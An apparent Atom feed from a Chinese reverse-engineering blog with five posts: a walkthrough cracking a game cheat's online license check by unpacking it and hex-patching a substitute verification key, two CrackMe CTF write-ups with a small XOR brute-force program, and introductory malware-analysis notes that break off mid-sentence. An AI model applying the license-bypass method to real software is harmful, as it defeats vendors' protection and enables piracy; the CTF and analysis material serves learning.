  <entry>
    <title>对某游戏辅助的网络验证破解</title>
    <link href="https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/"/>
    <id>https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:30:32.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对某游戏辅助的网络验证破解"><a href="#对某游戏辅助的网络验证破解" class="headerlink" title="对某游戏辅助的网络验证破解"></a>对某游戏辅助的网络验证破解</h1><p>吾爱破解上看到一个荒野行动辅助的破解，于是自己也试了一下</p><p><a href="https://i.loli.net/2018/07/15/5b4b5f4f30b2a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f4f30b2a.jpg" class="lazyload"></a></p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>先查壳，Detect It Easy不知道为什么查壳是UPX，Exeinfo PE和PEID看区段是.esp，所以是ES protect壳<br><a href="https://i.loli.net/2018/07/15/5b4b5f4f651e1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f4f651e1.jpg" class="lazyload"></a><br>使用WsUnPacker（通用脱壳机），直接脱进去就生成了一个dump文件，可以直接运行</p><h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><p>把软件拖入OD 会发现提示（代码被可能被压缩），点否</p><p>搜索字符串<br><a href="https://i.loli.net/2018/07/15/5b4b5f4f8a4e0.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f4f8a4e0.jpg" class="lazyload"></a></p><pre><code>eydata.net</code></pre><p>是易游的网址</p><p>需要网络验证，那么我们抓包</p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>sniff开启抓包，打开程序随便输入卡密，抓到post请求<br><a href="https://i.loli.net/2018/07/15/5b4b5f4fae24e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f4fae24e.jpg" class="lazyload"></a></p><p>画住的部分就是我们要找的了</p><p>回到od字符串，从那里进入<br>进入后下断点，F9运行，随意输入，程序停在断点处，F8步过一次，右下角堆栈出现字符串</p><p><a href="https://i.loli.net/2018/07/15/5b4b5f4fdfaf5.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f4fdfaf5.jpg" class="lazyload"></a></p><p>右键数据窗口跟随，HEX窗口二进制编辑<br><a href="https://i.loli.net/2018/07/15/5b4b5f502c970.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f502c970.jpg" class="lazyload"></a></p><p>记住不选保持大小，注意后面有个1.0，是代表版本，后面有用</p><h2 id="山寨登录验证"><a href="#山寨登录验证" class="headerlink" title="山寨登录验证"></a>山寨登录验证</h2><p>所以为了山寨一个登录验证，我们也需要去注册一个，注意要注册的是开发者入口<br>进去后找到webapi，复制红框里的那一串，稍后要用，并且开启接口<br><a href="https://i.loli.net/2018/07/15/5b4b5f505100a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f505100a.jpg" class="lazyload"></a><br>把复制的东西粘贴在刚刚的HEX里，保存文件</p><p>在我们的账户中添加一个用户，复制生成的卡密，粘贴后登录<br><a href="https://i.loli.net/2018/07/15/5b4b5f50741a8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5f50741a8.jpg" class="lazyload"></a></p><p>成功，然而这坑爹东西还没上线就让封了hhh</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;对某游戏辅助的网络验证破解&quot;&gt;&lt;a href=&quot;#对某游戏辅助的网络验证破解&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="破解" scheme="https://kabeor.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="网络验证" scheme="https://kabeor.github.io/tags/%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>百度杯十一月赛题CrackMe01</title>
    <link href="https://kabeor.github.io/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe01/"/>
    <id>https://kabeor.github.io/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe01/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:21:04.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="百度杯十一月赛题CrackMe01"><a href="#百度杯十一月赛题CrackMe01" class="headerlink" title="百度杯十一月赛题CrackMe01"></a>百度杯十一月赛题CrackMe01</h1><blockquote><p>1</p></blockquote><p><a href="https://i.loli.net/2018/07/15/5b4b686f276b8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686f276b8.jpg" class="lazyload"></a></p><p>用IDA打开，只有一个信息框，所以从弹窗下手</p><p>搜索message  API<br><a href="https://i.loli.net/2018/07/15/5b4b686f5976a.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686f5976a.jpg" class="lazyload"></a></p><p>看到MessageBoxW<br><a href="https://i.loli.net/2018/07/15/5b4b686f7bef4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686f7bef4.jpg" class="lazyload"></a><br>双击进去，Ctrl+X查看调用，发现没有被调用，于是放过</p><p>弹窗有可能为窗口类，搜索window<br><a href="https://i.loli.net/2018/07/15/5b4b686f91534.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686f91534.jpg" class="lazyload"></a></p><p>找到ShowWindow</p><p><a href="https://i.loli.net/2018/07/15/5b4b686fa4fa6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686fa4fa6.jpg" class="lazyload"></a><br>双击进入</p><p><a href="https://i.loli.net/2018/07/15/5b4b686fbae37.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686fbae37.jpg" class="lazyload"></a><br>自定义消息的位置</p><p>004028A5处      ebx累加</p><p>查看发送消息的API<br><a href="https://i.loli.net/2018/07/15/5b4b686fcf573.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686fcf573.jpg" class="lazyload"></a></p><p>Post MessageW</p><p>进入<br><a href="https://i.loli.net/2018/07/15/5b4b686fe2642.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b686fe2642.jpg" class="lazyload"></a></p><p>F5查看伪码<br><a href="https://i.loli.net/2018/07/15/5b4b6870041ab.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6870041ab.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/15/5b4b689d6bd56.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689d6bd56.jpg" class="lazyload"></a><br>把eax里的数组取出2c的长度，异或即可</p><blockquote><p>2</p></blockquote><p>通过ShowWindow 定位到进行判断的函数<br><a href="https://i.loli.net/2018/07/15/5b4b689d91d47.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689d91d47.jpg" class="lazyload"></a><br>可以发现这里的 DrawTextW 就是将chText打印到程序中央。<br>  <a href="https://i.loli.net/2018/07/15/5b4b689db54bc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689db54bc.jpg" class="lazyload"></a><br>可以看到这里有一堆Unicode编码的 文本。然后在程序上往上翻<br><a href="https://i.loli.net/2018/07/15/5b4b689ddb846.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689ddb846.jpg" class="lazyload"></a><br>这里对chText按位用同一个字符进行异或。 直接爆破。<br>  <a href="https://i.loli.net/2018/07/15/5b4b689e41076.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689e41076.jpg" class="lazyload"></a><br> <a href="https://i.loli.net/2018/07/15/5b4b689e54214.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689e54214.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char flag[] &#x3D; &#123; 0xF0,0xDA,0xD7,0xD1,0x8C,0xFF,0xF5,0xFE,0xE3,0xF8,0xE7,0xFF,0xE3,0xE9,0xF0,0xF3,0x85,0x80,0x84,0xF2,0xF4,0xF3,0 &#125;;</span><br><span class="line"></span><br><span class="line">for (int x &#x3D; 0; x &lt; 0xFF; x++)</span><br><span class="line">&#123;</span><br><span class="line">for (int i &#x3D; 0; i &lt; strlen(flag); i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i] ^ x);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot; %X\n&quot;, x);</span><br><span class="line">&#125;</span><br><span class="line">cin.get();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2018/07/15/5b4b689e76b06.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b689e76b06.jpg" class="lazyload"></a></p><p>ICHUNQIU_FE362DBE</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;百度杯十一月赛题CrackMe01&quot;&gt;&lt;a href=&quot;#百度杯十一月赛题CrackMe01&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
    <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>百度杯十一月赛题CrackMe02</title>
    <link href="https://kabeor.github.io/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe02/"/>
    <id>https://kabeor.github.io/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe02/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:22:41.846Z</updated>
    
    <content type="html"><![CDATA[<h1 id="百度杯十一月赛题CrackMe02"><a href="#百度杯十一月赛题CrackMe02" class="headerlink" title="百度杯十一月赛题CrackMe02"></a>百度杯十一月赛题CrackMe02</h1><p><a href="https://i.loli.net/2018/07/15/5b4b68ec5cd9d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b68ec5cd9d.jpg" class="lazyload"></a></p><p>IDA查看导入函数，发现GetDlgaitemTextA只有一处调用<br><a href="https://i.loli.net/2018/07/15/5b4b68ec706ac.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b68ec706ac.jpg" class="lazyload"></a></p><p>打开OD，在GetDlgItemTextA下断点F9输入后断下<br><a href="https://i.loli.net/2018/07/15/5b4b68ec96019.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b68ec96019.jpg" class="lazyload"></a></p><p>接下来就真的不会了。。。留着以后做吧</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;百度杯十一月赛题CrackMe02&quot;&gt;&lt;a href=&quot;#百度杯十一月赛题CrackMe02&quot; class=&quot;headerlink&quot; title=&quot;百度杯十一月赛题CrackMe02&quot;&gt;&lt;/a&gt;百度杯十一月赛题CrackMe02&lt;/h1&gt;&lt;p&gt;&lt;a</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋Reverse赛题" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8BReverse%E8%B5%9B%E9%A2%98/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
    <category term="CTF" scheme="https://kabeor.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第0章 恶意代码分析技术入门</title>
    <link href="https://kabeor.github.io/%E7%AC%AC0%E7%AB%A0%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/"/>
    <id>https://kabeor.github.io/%E7%AC%AC0%E7%AB%A0%20%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%85%A5%E9%97%A8/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:23:03.271Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第0章-恶意代码分析技术入门"><a href="#第0章-恶意代码分析技术入门" class="headerlink" title="第0章 恶意代码分析技术入门"></a>第0章 恶意代码分析技术入门</h1><h2 id="0x1-恶意代码分析目标"><a href="#0x1-恶意代码分析目标" class="headerlink" title="0x1 恶意代码分析目标"></a>0x1 恶意代码分析目标</h2><blockquote><p>分析可疑的恶意代码：</p></blockquote><ol><li>确定该二进制程序可以做什么</li><li>如何在网络上检测出它</li><li>如何衡量并消除它所带来的危害</li></ol><blockquote><p>恶意代码分析可以用来编写基于主机和基于网络的检测验证码<br>基于主机的特征码（感染迹象），用于在受感染的主机上检测出恶意代码<br>恶意代码感染迹象关注的是恶意代码对系统做了什么<br>网络特征码是通过检测网络流量来检测恶意代码的</p></blockquote><h2 id="0x2-恶意代码分析技术"><a href="#0x2-恶意代码分析技术" class="headerlink" title="0x2 恶意代码分析技术"></a>0x2 恶意代码分析技术</h2><p>两类基本方法：</p><ol><li>静态分析</li><li>动态分析</li></ol><h3 id="静态分析基础技术"><a href="#静态分析基础技术" class="headerlink" title="静态分析基础技术"></a>静态分析基础技术</h3><p>检查可执行文件但不查看具体指令</p><h3 id="动态分析基础技术"><a href="#动态分析基础技术" class="headerlink" title="动态分析基础技术"></a>动态分析基础技术</h3><p>运行恶意代码并观察系统上的行为，以移除感染，产生有效的检测特征码</p><h3 id="静态分析高级技术"><a href="#静态分析高级技术" class="headerlink" title="静态分析高级技术"></a>静态分析高级技术</h3><p>主要是对恶意代码内部机制的逆向工程,通过将可执行文件装载到反汇编<br>器中,查看程序指令,来发现恶意代码到底做了什么。这些指令是被CPU执行的,所以静态分析高级技术能够告诉你程序具体做了哪些事情。</p><h3 id="动态分析高级技术"><a href="#动态分析高级技术" class="headerlink" title="动态分析高级技术"></a>动态分析高级技术</h3><p>使用调试器来检查一个恶意可执行程序运行时刻的内部状态</p><h2 id="0x3-恶意代码类型"><a href="#0x3-恶意代码类型" class="headerlink" title="0x3 恶意代码类型"></a>0x3 恶意代码类型</h2><blockquote><p>后门：恶意代码将自身安装到一 台计算机来允许攻击者访问。后门程序通常让攻击者只需很少认证甚至无须认证，便可连接到远程计算机上，并可以在本地系统执行命令。</p><p>僵尸网络：与后门类似，也允许攻击者访问系统。但是所有被同一 个僵尸网络感染的计算机将会从一 台控制命令服务器接收到相同的命令。</p></blockquote><blockquote><p>下载器：这是一类只是用来下载其他恶意代码的恶意代码。下载器通常是在攻击者获得系统的访问时首先进行安装的。下载器程序会下载和安装其他的恶意代码。</p></blockquote><blockquote><p>间谍软件：这是一 类从受害计算机上收集信息并发送给攻击者的恶意代码。比如：嗅探器、密码哈希采集器、键盘记录器等。这类恶意代码通常用来获取E-mail、在线网银等账号的访问信息。</p></blockquote><blockquote><p>启动器：用来启动其他恶意程序的恶意代码。通常情况下，启动器使用一 些非传统的技术，来启动其他恶意程序，以确保其隐蔽性，或者以更高权限访问系统。</p></blockquote><blockquote><p>内核套件：设计用来隐藏其他恶意代码的恶意代码。内核套件通常是与其他恶意代码（如后门）组合成工具套装，来允许为攻击者提供远程访问，并且使代码很难被受害者发现。</p></blockquote><blockquote><p>勒索软件：设计成吓唬受感染的用户，来勒索他们购买某些东西的恶意代码。这类软件通常有一个用户界面，使得它看起来像是一 个杀毒软件或其他安全程序。它会通知用户系统中存在恶意代码，而唯一 除掉它们的方法只有购买他们的 “软件” ，而事实上，他们所卖软件的全部功能只不过是将勒索软件进行移除而已。</p></blockquote><blockquote><p>发送垃坡邮件的恶意代码：这类恶意代码在感染用户计算机之后，便会使用系统与网络资源来发送大量的垃圾邮件。这类恶意代码通过为攻击者出售垃圾邮件发送服务而获得收益。</p></blockquote><blockquote><p>蠕虫或计算机病毒：可以自我复制和感染其他计算机的恶意代码。</p></blockquote><h2 id="恶意代码分析通用规则"><a href="#恶意代码分析通用规则" class="headerlink" title="恶意代码分析通用规则"></a>恶意代码分析通用规则</h2><blockquote><p>首先， 不要过于陷入细节。<br>其次， 请记住对于不同的工作任务， 可以使用不同的工具和方法。<br>最后， 请记住， 恶意代码分析就像是猫抓老鼠的游戏。 在新的恶意代码分析技术开发的同时，恶意代码编写者也在回应着可以挫败分析的新技术。 作为一名恶意代码分析师， 你如果想要取得成功， 就必须能够认识、 理解和战胜这些新技术， 并能够快速地应对恶意代码分析艺术的新变化。</p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第0章-恶意代码分析技术入门&quot;&gt;&lt;a href=&quot;#第0章-恶意代码分析技术入门&quot; class=&quot;headerlink&quot; title=&quot;第0章 恶意代码分析技术入门&quot;&gt;&lt;/a&gt;第0章 恶意代码分析技术入门&lt;/h1&gt;&lt;h2 id=&quot;0x1-恶意代码分析目标&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第1章 静态分析基础技术</title>
    <link href="https://kabeor.github.io/%E7%AC%AC1%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/"/>
    <id>https://kabeor.github.io/%E7%AC%AC1%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80%E6%8A%80%E6%9C%AF/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:23:17.721Z</updated>
    
    <content type="html"><![CDATA[<h1 id="静态分析基础技术"><a href="#静态分析基础技术" class="headerlink" title="静态分析基础技术"></a>静态分析基础技术</h1><h2 id="1x1-反病毒引擎扫描：实用的第一步"><a href="#1x1-反病毒引擎扫描：实用的第一步" class="headerlink" title="1x1 反病毒引擎扫描：实用的第一步"></a>1x1 反病毒引擎扫描：实用的第一步</h2><blockquote><p>在分析一 个可疑的恶意代码样本时，第一 步就最好是拿多个反病毒软件扫描下这个文件，看是否有哪个引擎已经能够识别它。</p></blockquote><blockquote><p>反病毒软件主要依靠一 个已知恶意代码可识别片段的特征数据库（病毒文件特征库），以及基于行为与模式匹配的分析（启发式检测），来识别可疑文件。</p></blockquote><blockquote><p>恶意代码编写者可以很容易地修改自己的代码，从而改变这些程序的特征，来躲避反病毒引擎的检测。</p></blockquote><blockquote><p>一 些罕见的恶意代码通常也不会被反病毒软件所识别，因为它们根本就不在病毒文件特征库里。</p></blockquote><blockquote><p>启发式检测，尽管经常也能成功地识别出一 些未知恶意代间，但仍然可以被一 些新型独特的恶意代码所绕过。</p></blockquote><blockquote><p>不同的反病毒软件使用了不同的特征库和启发式检测方法，所以对同一 个可疑恶意代码样本，运行多个不同反病毒软件进行扫描检测是相当有必要的。</p></blockquote><blockquote><p>VirusTotal,腾讯哈勃等</p></blockquote><h2 id="1x2-哈希值：恶意代码的指纹"><a href="#1x2-哈希值：恶意代码的指纹" class="headerlink" title="1x2 哈希值：恶意代码的指纹"></a>1x2 哈希值：恶意代码的指纹</h2><blockquote><p>哈希是一种用来唯一 标识恶意代码的常用方法。恶意代码样本通过一 个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值 （类似于一种指纹。</p></blockquote><blockquote><p>用途<br>将哈希值作为标签使用。<br>与其他分析师分享哈希值，以帮助他们来识别恶意代码。<br>在线搜索这段晗希值，看看这个文件是否已经被识别。</p></blockquote><h2 id="1x3-查找字符串"><a href="#1x3-查找字符串" class="headerlink" title="1x3 查找字符串"></a>1x3 查找字符串</h2><p>搜索ASCII和Unicode</p><h2 id="1x4-加壳和混淆恶意代码"><a href="#1x4-加壳和混淆恶意代码" class="headerlink" title="1x4 加壳和混淆恶意代码"></a>1x4 加壳和混淆恶意代码</h2><blockquote><p>混淆程序是恶意代码编写者尝试去隐藏其执行过程的代码，加壳程序是混淆程序中的一类</p></blockquote><blockquote><p>加壳和混淆代码通常至少会包含LoadLibrary和GetProcAdress函数，用来加载和使用其他函数的功能。</p></blockquote><h3 id="1-文件加壳"><a href="#1-文件加壳" class="headerlink" title="1. 文件加壳"></a>1. 文件加壳</h3><p><a href="https://i.loli.net/2018/07/15/5b4b6382722b8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6382722b8.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/15/5b4b6382c2321.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6382c2321.jpg" class="lazyload"></a></p><h3 id="2-使用PEiD检测加壳"><a href="#2-使用PEiD检测加壳" class="headerlink" title="2. 使用PEiD检测加壳"></a>2. 使用PEiD检测加壳</h3><h2 id="1x5-PE文件格式"><a href="#1x5-PE文件格式" class="headerlink" title="1x5 PE文件格式"></a>1x5 PE文件格式</h2><p><a href="https://i.loli.net/2018/07/15/5b4b63836b31e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b63836b31e.jpg" class="lazyload"></a></p><h2 id="1x6-链接库与函数"><a href="#1x6-链接库与函数" class="headerlink" title="1x6 链接库与函数"></a>1x6 链接库与函数</h2><p>导入函数：是一个程序所使用的但存储在另一个程序中的那些函数</p><h3 id="1-静态链接，运行时链接与动态链接"><a href="#1-静态链接，运行时链接与动态链接" class="headerlink" title="1. 静态链接，运行时链接与动态链接"></a>1. 静态链接，运行时链接与动态链接</h3><blockquote><p>当一个库被静态链接到可执行程序时，所有这个库中的代码都会被复制到可执行程序中，这会让可执行程序增大许多。而在分析代码时，很难区分静态链接的代码与可执行程序自身代码，因为在PE文件头中没有迹象表明这个文件包含有链接代码。</p></blockquote><blockquote><p>虽然运行时链接在合法程序中并不流行，但是在恶意代码中是常用的，特别是当恶意代码被加壳或是混淆的时候。使用运行时链接的可执行程序，只有当需要使用函数时，才链接到库，而不是像动态链接模式那样在程序启动时就会链接。</p></blockquote><blockquote><p>一些Windows API允许程序员导入并没有在程序的文件头中列出的链接函数。</p></blockquote><blockquote><p>在所有链接方法中，动态链接是最常见的，当代码库被动态链接时，宿主操作系统会在程序被装载时搜索所需的代码库，如果程序调用了被链接的库函数，这个函数会在代码库中执行。</p></blockquote><blockquote><p>PE文件头中存储了每个将被装载的库文件，以及每个会被程序使用的函数信息。程序所使用的库与调用的函数，经常是一 个程序中最重要的部分，识别它们尤为重要，因为这些信息允许我们来猜测这个恶意代码样本到底干了些什么事情。</p></blockquote><h3 id="2-使用DependencyWalker工具探索动态链接函数"><a href="#2-使用DependencyWalker工具探索动态链接函数" class="headerlink" title="2. 使用DependencyWalker工具探索动态链接函数"></a>2. 使用DependencyWalker工具探索动态链接函数</h3><p>Dependency Walker工具，包含在微软VisualStudio的一些版本与其他微软开发包中，支持列出可执行文件的动态链接函数。</p><blockquote><p>程序所装载的DLL可以告诉你很多关于程序功能的信息。<br><a href="https://i.loli.net/2018/07/15/5b4b63838e3c5.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b63838e3c5.jpg" class="lazyload"></a></p></blockquote><h3 id="3-导入函数"><a href="#3-导入函数" class="headerlink" title="3. 导入函数"></a>3. 导入函数</h3><p>PE文件头中也包含了可执行文件使用的特定函数相关信息。Windows函数的这些名字，可以告诉你这个可执行文件到底干了些什么事情。</p><h3 id="4-导出函数"><a href="#4-导出函数" class="headerlink" title="4. 导出函数"></a>4. 导出函数</h3><blockquote><p>与导入函数类似，DLL和EXE的导出函数，是用来与其他程序和代码进行交互时所使用的。通常，一个DLL会实现一 个或多个功能函数，然后将它们导出，使得别的程序可以导入并使用这些函数。</p></blockquote><blockquote><p>PE文件中包含一 个文件中导出了哪些函数的信息。因为D LL文件本身就是实现一 些导出函数然后被EXE可执行文件使用的，因此导出函数在DLL文件中是最常见的。而EXE文件并不是设计成为其他EXE文件提供功能的，因此里面很少会有导出函数。如果你在可执行文件中发现了导出函数，它们经常会提供一 些有用的信息。</p></blockquote><h2 id="1x7-静态分析技术实践"><a href="#1x7-静态分析技术实践" class="headerlink" title="1x7 静态分析技术实践"></a>1x7 静态分析技术实践</h2><h3 id="1-PotentialKeylogger-exe-一个未加壳的可执行文件"><a href="#1-PotentialKeylogger-exe-一个未加壳的可执行文件" class="headerlink" title="1. PotentialKeylogger.exe:一个未加壳的可执行文件"></a>1. PotentialKeylogger.exe:一个未加壳的可执行文件</h3><p>恶意代码分析师最需要关注的函数列表<br><a href="https://i.loli.net/2018/07/15/5b4b6383b0dea.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b6383b0dea.jpg" class="lazyload"></a></p><blockquote><p>Kerne/32.dll导入函数告诉我们，这个软件会打开和操作进程（如OpenProcess、 GetCurrentProcess和GetProcessHeap等），以及对文件进行操作（如ReadFile、CreateFile 和WriteFile）。</p></blockquote><blockquote><p>FindFirstFile和IFindNextFile函数是特别值得关注的，因为它们提供的功能是搜索一 个目录下的所有文件。</p></blockquote><blockquote><p>从User32.dll导入的函数甚至更加有趣，大量的图形化界面操作函数 （如 Register、ClassEx, SetWindowText和ShowWindow等）显示这个程序很可能使用了一 个图形化界面 （虽然GU I并不一定会显示给用户〉。</p></blockquote><blockquote><p>而SetWindowsHookEx函数是间谍软件经常使用的函数，也是键盘记录器用来接收键盘输入最流行的方法。这个函数也会有着一 